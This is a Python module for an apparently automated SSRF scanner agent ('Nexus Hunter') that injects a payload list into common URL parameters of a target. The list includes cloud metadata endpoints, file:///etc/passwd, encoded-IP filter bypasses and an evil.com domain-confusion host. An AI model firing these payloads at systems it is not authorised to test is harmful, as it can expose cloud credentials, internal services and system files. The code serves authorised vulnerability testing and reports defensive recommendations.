"""
SSRF Agent for Nexus Hunter
Server-Side Request Forgery detection and exploitation
"""

import asyncio
import base64
import json
import re
import urllib.parse
from typing import Dict, List, Any, Optional, Set
from dataclasses import dataclass

import httpx
from loguru import logger

from agents.base import BaseAgent


@dataclass
class SSRFPayload:
    """SSRF payload for testing"""
    name: str
    payload: str
    description: str
    category: str
    severity: str
    detection_method: str


class SSRFAgent(BaseAgent):
    """Advanced SSRF detection and exploitation agent"""
    
    def __init__(self):
        super().__init__("SSRFAgent")
        self.ssrf_payloads = self._initialize_ssrf_payloads()
        self.discovered_vulnerabilities: List[Dict[str, Any]] = []
        self.tested_endpoints: Set[str] = set()
        
        # Safety constraints
        self.max_requests_per_endpoint = 15
        self.request_delay = 2.0
        self.max_concurrent_tests = 2
        
        # Common internal/cloud endpoints to test
        self.internal_targets = [
            "127.0.0.1", "localhost", "0.0.0.0", "::1",
            "10.0.0.1", "172.16.0.1", "192.168.1.1",
            "169.254.169.254",  # AWS metadata
            "metadata.google.internal"  # GCP metadata
        ]
        
        # Port scanning targets
        self.common_ports = ["22", "80", "443", "3306", "5432", "6379", "27017", "9200"]
    
    def _initialize_ssrf_payloads(self) -> Dict[str, List[SSRFPayload]]:
        """Initialize SSRF testing payloads"""
        return {
            "basic_internal": [
                SSRFPayload(
                    name="Localhost HTTP",
                    payload="http://127.0.0.1:80/",
                    description="Basic localhost SSRF test",
                    category="Internal Network Access",
                    severity="high",
                    detection_method="response_analysis"
                ),
                SSRFPayload(
                    name="Localhost Alternative",
                    payload="http://localhost:80/",
                    description="Localhost using hostname",
                    category="Internal Network Access", 
                    severity="high",
                    detection_method="response_analysis"
                ),
                SSRFPayload(
                    name="IPv6 Localhost",
                    payload="http://[::1]:80/",
                    description="IPv6 localhost access",
                    category="Internal Network Access",
                    severity="high",
                    detection_method="response_analysis"
                )
            ],
            "cloud_metadata": [
                SSRFPayload(
                    name="AWS Metadata",
                    payload="http://169.254.169.254/latest/meta-data/",
                    description="AWS EC2 metadata service access",
                    category="Cloud Metadata Access",
                    severity="critical",
                    detection_method="metadata_keywords"
                ),
                SSRFPayload(
                    name="GCP Metadata",
                    payload="http://metadata.google.internal/computeMetadata/v1/",
                    description="Google Cloud metadata service",
                    category="Cloud Metadata Access",
                    severity="critical",
                    detection_method="metadata_keywords"
                ),
                SSRFPayload(
                    name="Azure Metadata",
                    payload="http://169.254.169.254/metadata/instance?api-version=2020-09-01",
                    description="Azure metadata service",
                    category="Cloud Metadata Access",
                    severity="critical",
                    detection_method="metadata_keywords"
                )
            ],
            "protocol_bypass": [
                SSRFPayload(
                    name="File Protocol",
                    payload="file:///etc/passwd",
                    description="Local file access via file protocol",
                    category="File System Access",
                    severity="high",
                    detection_method="file_content"
                ),
                SSRFPayload(
                    name="FTP Protocol",
                    payload="ftp://127.0.0.1:21/",
                    description="FTP protocol access",
                    category="Protocol Bypass",
                    severity="medium",
                    detection_method="response_analysis"
                ),
                SSRFPayload(
                    name="LDAP Protocol",
                    payload="ldap://127.0.0.1:389/",
                    description="LDAP protocol access",
                    category="Protocol Bypass",
                    severity="medium",
                    detection_method="response_analysis"
                )
            ],
            "bypass_techniques": [
                SSRFPayload(
                    name="URL Encoding",
                    payload="http://127.0.0.1%3A80/",
                    description="URL encoded bypass attempt",
                    category="Filter Bypass",
                    severity="medium",
                    detection_method="response_analysis"
                ),
                SSRFPayload(
                    name="Decimal IP",
                    payload="http://2130706433:80/",  # 127.0.0.1 in decimal
                    description="Decimal IP representation",
                    category="Filter Bypass",
                    severity="medium",
                    detection_method="response_analysis"
                ),
                SSRFPayload(
                    name="Hex IP",
                    payload="http://0x7f000001:80/",  # 127.0.0.1 in hex
                    description="Hexadecimal IP representation",
                    category="Filter Bypass",
                    severity="medium",
                    detection_method="response_analysis"
                ),
                SSRFPayload(
                    name="Domain Confusion",
                    payload="http://127.0.0.1.evil.com/",
                    description="Domain confusion bypass",
                    category="Filter Bypass",
                    severity="low",
                    detection_method="response_analysis"
                )
            ]
        }
    
    async def execute(self, target: str, config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Main execution method required by BaseAgent"""
        return await self.scan(target, **(config or {}))
    
    async def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Perform comprehensive SSRF vulnerability assessment
        
        Args:
            target: Target URL to test for SSRF
            **kwargs: Additional scan options
        """
        try:
            results = {
                "target": target,
                "vulnerabilities": [],
                "tested_parameters": [],
                "potential_ssrf": [],
                "internal_access": [],
                "cloud_access": [],
                "statistics": {}
            }
            
            self.logger.info(f"Starting SSRF scan for {target}")
            
            # Normalize target URL to include protocol
            if not target.startswith(('http://', 'https://')):
                target = f"http://{target}"
            
            # Find potential SSRF parameters
            parameters = await self._discover_ssrf_parameters(target)
            results["tested_parameters"] = parameters
            
            # Test each parameter for SSRF
            for param_info in parameters:
                vuln_results = await self._test_parameter_ssrf(param_info, **kwargs)
                if vuln_results:
                    results["vulnerabilities"].extend(vuln_results)
            
            # Test URL-based SSRF (if target accepts URLs)
            url_results = await self._test_url_ssrf(target, **kwargs)
            if url_results:
                results["potential_ssrf"].extend(url_results)
            
            # Analyze results
            results = await self._analyze_ssrf_results(results)
            
            self.logger.info(f"SSRF scan completed for {target}")
            return results
            
        except Exception as e:
            self.logger.error(f"SSRF scan failed: {e}")
            return {"error": str(e), "target": target}
    
    async def _discover_ssrf_parameters(self, target: str) -> List[Dict[str, Any]]:
        """Discover potential SSRF parameters"""
        parameters = []
        
        # Common SSRF parameter names
        ssrf_params = [
            "url", "uri", "path", "continue", "dest", "destination", "goto", "out",
            "redirect", "return", "return_url", "return_path", "callback", "webhook",
            "fetch", "get", "retrieve", "download", "load", "import", "include",
            "file", "doc", "document", "page", "view", "show", "open", "read",
            "proxy", "api", "endpoint", "service", "target", "host", "server",
            "link", "src", "source", "feed", "rss", "xml", "json", "data"
        ]
        
        try:
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                # Test GET parameters
                for param in ssrf_params[:20]:  # Limit for performance
                    param_info = {
                        "name": param,
                        "method": "GET",
                        "location": "query",
                        "target": target,
                        "test_url": f"{target}{'&' if '?' in target else '?'}{param}=http://127.0.0.1/"
                    }
                    parameters.append(param_info)
                
                # Test POST parameters (if target supports POST)
                try:
                    response = await client.post(target, data={"test": "value"})
                    if response.status_code not in [404, 405]:  # POST is supported
                        for param in ssrf_params[:10]:  # Limited POST testing
                            param_info = {
                                "name": param,
                                "method": "POST",
                                "location": "body",
                                "target": target
                            }
                            parameters.append(param_info)
                except:
                    pass  # POST not supported or failed
        
        except Exception as e:
            self.logger.error(f"Parameter discovery failed: {e}")
        
        return parameters
    
    async def _test_parameter_ssrf(self, param_info: Dict[str, Any], **kwargs) -> List[Dict[str, Any]]:
        """Test a specific parameter for SSRF vulnerability"""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(timeout=15, verify=False) as client:
                # Test different payload categories
                for category, payloads in self.ssrf_payloads.items():
                    for payload in payloads[:3]:  # Limit payloads per category
                        vuln = await self._test_single_ssrf_payload(
                            client, param_info, payload, **kwargs
                        )
                        if vuln:
                            vulnerabilities.append(vuln)
                        
                        # Delay between requests
                        await asyncio.sleep(self.request_delay)
        
        except Exception as e:
            self.logger.error(f"Parameter SSRF testing failed: {e}")
        
        return vulnerabilities
    
    async def _test_single_ssrf_payload(self, client: httpx.AsyncClient, param_info: Dict[str, Any], 
                                      payload: SSRFPayload, **kwargs) -> Optional[Dict[str, Any]]:
        """Test a single SSRF payload"""
        try:
            # Prepare request based on method
            if param_info["method"] == "GET":
                test_url = f"{param_info['target']}{'&' if '?' in param_info['target'] else '?'}{param_info['name']}={urllib.parse.quote(payload.payload)}"
                response = await client.get(test_url)
            else:
                # POST request
                data = {param_info["name"]: payload.payload}
                response = await client.post(param_info["target"], data=data)
            
            # Analyze response for SSRF indicators
            is_vulnerable, evidence = await self._analyze_ssrf_response(response, payload)
            
            if is_vulnerable:
                return {
                    "parameter": param_info["name"],
                    "method": param_info["method"],
                    "payload": payload.payload,
                    "payload_name": payload.name,
                    "category": payload.category,
                    "severity": payload.severity,
                    "description": payload.description,
                    "evidence": evidence,
                    "status_code": response.status_code,
                    "response_time": getattr(response, "elapsed", {}).get("total_seconds", 0),
                    "vulnerability_type": "SSRF",
                    "target": param_info["target"]
                }
        
        except Exception as e:
            self.logger.debug(f"SSRF payload test failed: {e}")
        
        return None
    
    async def _analyze_ssrf_response(self, response: httpx.Response, payload: SSRFPayload) -> tuple[bool, str]:
        """Analyze response for SSRF vulnerability indicators"""
        try:
            response_text = response.text.lower()
            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
            
            evidence_indicators = []
            
            # Check detection method specific indicators
            if payload.detection_method == "metadata_keywords":
                metadata_keywords = [
                    "instance-id", "ami-id", "security-groups", "meta-data",
                    "user-data", "iam", "credentials", "token", "aws", "gcp", "azure"
                ]
                if any(keyword in response_text for keyword in metadata_keywords):
                    evidence_indicators.append("Cloud metadata keywords found in response")
            
            elif payload.detection_method == "file_content":
                file_indicators = [
                    "root:", "bin:", "daemon:", "/etc/passwd", "/etc/shadow"
                ]
                if any(indicator in response_text for indicator in file_indicators):
                    evidence_indicators.append("Local file content detected")
            
            elif payload.detection_method == "response_analysis":
                # Check for different response patterns
                if response.status_code != 404:
                    if response.status_code in [200, 302, 403]:
                        evidence_indicators.append(f"Unexpected status code: {response.status_code}")
                    
                    # Check for internal service responses
                    internal_indicators = [
                        "apache", "nginx", "iis", "tomcat", "jetty", 
                        "connection refused", "internal server", "unauthorized",
                        "forbidden", "redis", "mysql", "postgresql"
                    ]
                    if any(indicator in response_text for indicator in internal_indicators):
                        evidence_indicators.append("Internal service response detected")
                    
                    # Check response time (internal requests might be faster)
                    response_time = getattr(response, "elapsed", {}).get("total_seconds", 0)
                    if response_time < 0.1:  # Very fast response might indicate internal access
                        evidence_indicators.append("Unusually fast response time")
            
            # Check for error messages that might indicate SSRF
            error_indicators = [
                "connection timed out", "connection refused", "host not found",
                "invalid url", "malformed url", "protocol not supported",
                "ssrf", "server side request"
            ]
            if any(indicator in response_text for indicator in error_indicators):
                evidence_indicators.append("SSRF-related error message detected")
            
            # Check headers for internal service signatures
            server_header = headers.get("server", "")
            if any(sig in server_header for sig in ["apache", "nginx", "iis", "python", "node"]):
                evidence_indicators.append(f"Internal server signature: {server_header}")
            
            return len(evidence_indicators) > 0, "; ".join(evidence_indicators)
        
        except Exception as e:
            self.logger.debug(f"Response analysis failed: {e}")
            return False, ""
    
    async def _test_url_ssrf(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Test URL-based SSRF vulnerabilities"""
        potential_ssrf = []
        
        try:
            # Test if target processes URLs directly
            test_payloads = [
                "http://127.0.0.1:80/",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd"
            ]
            
            async with httpx.AsyncClient(timeout=10, verify=False) as client:
                for payload in test_payloads:
                    try:
                        # Try different ways to pass the URL
                        test_methods = [
                            f"{target}?url={urllib.parse.quote(payload)}",
                            f"{target}?fetch={urllib.parse.quote(payload)}",
                            f"{target}?proxy={urllib.parse.quote(payload)}"
                        ]
                        
                        for method_url in test_methods:
                            response = await client.get(method_url)
                            
                            # Basic analysis for potential SSRF
                            if response.status_code not in [404, 400] and len(response.content) > 0:
                                potential_ssrf.append({
                                    "method": "URL_DIRECT",
                                    "payload": payload,
                                    "test_url": method_url,
                                    "status_code": response.status_code,
                                    "content_length": len(response.content),
                                    "potential_vulnerability": True
                                })
                    
                    except Exception as e:
                        self.logger.debug(f"URL SSRF test failed: {e}")
        
        except Exception as e:
            self.logger.error(f"URL SSRF testing failed: {e}")
        
        return potential_ssrf
    
    async def _analyze_ssrf_results(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze and categorize SSRF scan results"""
        try:
            # Categorize vulnerabilities by severity and type
            critical_vulns = []
            high_vulns = []
            medium_vulns = []
            low_vulns = []
            
            for vuln in results["vulnerabilities"]:
                severity = vuln.get("severity", "low").lower()
                if severity == "critical":
                    critical_vulns.append(vuln)
                elif severity == "high":
                    high_vulns.append(vuln)
                elif severity == "medium":
                    medium_vulns.append(vuln)
                else:
                    low_vulns.append(vuln)
            
            # Categorize by access type
            internal_access = []
            cloud_access = []
            file_access = []
            
            for vuln in results["vulnerabilities"]:
                category = vuln.get("category", "").lower()
                if "internal network" in category:
                    internal_access.append(vuln)
                elif "cloud metadata" in category:
                    cloud_access.append(vuln)
                elif "file system" in category:
                    file_access.append(vuln)
            
            results["categorized_vulnerabilities"] = {
                "critical": critical_vulns,
                "high": high_vulns,
                "medium": medium_vulns,
                "low": low_vulns
            }
            
            results["access_types"] = {
                "internal_access": internal_access,
                "cloud_access": cloud_access,
                "file_access": file_access
            }
            
            results["statistics"] = {
                "total_vulnerabilities": len(results["vulnerabilities"]),
                "critical_count": len(critical_vulns),
                "high_count": len(high_vulns),
                "medium_count": len(medium_vulns),
                "low_count": len(low_vulns),
                "parameters_tested": len(results["tested_parameters"]),
                "internal_access_count": len(internal_access),
                "cloud_access_count": len(cloud_access),
                "file_access_count": len(file_access)
            }
            
            # Risk assessment
            risk_score = (
                len(critical_vulns) * 4 +
                len(high_vulns) * 3 +
                len(medium_vulns) * 2 +
                len(low_vulns) * 1
            )
            
            results["risk_assessment"] = {
                "risk_score": risk_score,
                "risk_level": self._calculate_risk_level(risk_score),
                "recommendations": self._generate_ssrf_recommendations(results)
            }
            
            return results
        
        except Exception as e:
            self.logger.error(f"SSRF results analysis failed: {e}")
            return results
    
    def _calculate_risk_level(self, risk_score: int) -> str:
        """Calculate risk level based on score"""
        if risk_score >= 12:
            return "CRITICAL"
        elif risk_score >= 8:
            return "HIGH"
        elif risk_score >= 4:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _generate_ssrf_recommendations(self, results: Dict[str, Any]) -> List[str]:
        """Generate SSRF-specific security recommendations"""
        recommendations = []
        
        if results["access_types"]["cloud_access"]:
            recommendations.append("CRITICAL: Block access to cloud metadata services (169.254.169.254)")
            recommendations.append("Implement strict allowlisting for external URLs")
        
        if results["access_types"]["internal_access"]:
            recommendations.append("HIGH: Prevent access to internal/private IP ranges")
            recommendations.append("Implement proper input validation for URL parameters")
        
        if results["access_types"]["file_access"]:
            recommendations.append("HIGH: Disable dangerous protocols (file://, ftp://, etc.)")
        
        if results["statistics"]["total_vulnerabilities"] > 0:
            recommendations.extend([
                "Implement URL validation with strict allowlisting",
                "Use a dedicated service for external URL fetching with proper controls",
                "Add timeout and size limits for external requests",
                "Monitor and log all external URL requests",
                "Consider using a proxy service for external requests"
            ])
        
        return recommendations
    
    def get_vulnerability_types(self) -> List[str]:
        """Get types of SSRF vulnerabilities this agent can detect"""
        return [
            "Internal Network Access",
            "Cloud Metadata Access", 
            "File System Access",
            "Protocol Bypass",
            "Filter Bypass"
        ]
    
    def get_description(self) -> str:
        """Get agent description"""
        return "Advanced SSRF detection agent capable of testing internal network access, cloud metadata access, and protocol bypass techniques"

